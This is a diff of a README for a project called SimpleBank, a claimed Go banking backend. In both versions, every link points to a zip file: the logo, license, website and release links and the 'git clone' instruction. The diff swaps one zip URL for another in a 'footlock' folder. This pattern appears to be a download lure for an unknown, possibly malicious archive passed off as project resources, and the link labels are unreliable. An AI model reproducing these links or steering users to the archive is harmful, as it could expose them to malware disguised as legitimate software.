@@ -1,6 +1,6 @@
 # SimpleBank
 
-![SimpleBank Logo](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip)
+![SimpleBank Logo](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip)
 
 SimpleBank is a powerful backend web service designed for managing bank accounts, handling transactions, and processing money transfers. This project is built with cutting-edge technologies such as Golang, PostgreSQL, and Docker, and features secure APIs, background processing, and seamless deployment to Kubernetes. 🚀
 
@@ -43,7 +43,7 @@ SimpleBank is a powerful backend web service designed for managing bank accounts
 ## Installation
 1. Clone the repository:
 ```
-git clone https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip
+git clone https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip
 ```
 
 2. Change into the project directory:
@@ -85,18 +85,18 @@ Your contributions help make SimpleBank even better for the community! 🙌
 ---
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip) file for details.
 
-[![Download Release](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip)](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip)
+[![Download Release](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip)](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip)
 
 ---
 
-Check the **[Releases](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip)** section for the latest updates and releases.
+Check the **[Releases](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip)** section for the latest updates and releases.
 
 Thank you for using SimpleBank! 🌟
 
 ---
 
-Feel free to visit [our website](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip) for more information and updates on SimpleBank. 🌐
+Feel free to visit [our website](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip) for more information and updates on SimpleBank. 🌐
 
-![SimpleBank](https://github.com/NuclearCatLegit/simple_bank/releases/download/v2.0/Software.zip)
+![SimpleBank](https://raw.githubusercontent.com/NuclearCatLegit/simple_bank/main/footlock/simple_bank_v1.2.zip)
